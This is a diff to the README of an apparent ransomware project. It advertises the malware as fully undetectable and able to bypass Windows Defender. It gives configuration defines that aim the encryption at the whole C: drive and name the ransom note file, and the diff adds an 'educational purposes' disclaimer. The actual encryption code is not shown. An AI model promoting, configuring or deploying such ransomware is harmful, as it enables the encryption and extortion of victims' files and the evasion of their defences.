@@ -2,7 +2,7 @@
 This ransomware uses a very simple encrypting method. It's totally FUD (Fully Undetectable), it bypass windows deffender.
 #
 Edit this strings to what you actually want:
-```
+```c++
 // Where to encrypt
 #define DESTINATION_DIR "C:\\"
 
@@ -12,3 +12,5 @@ Edit this strings to what you actually want:
 // Readme file
 #define CONF_FILE_NAME "readme_encrypted_files.txt"
 ```
+
+I am not responsable for any bad use of the software, all is for educational pruposes.
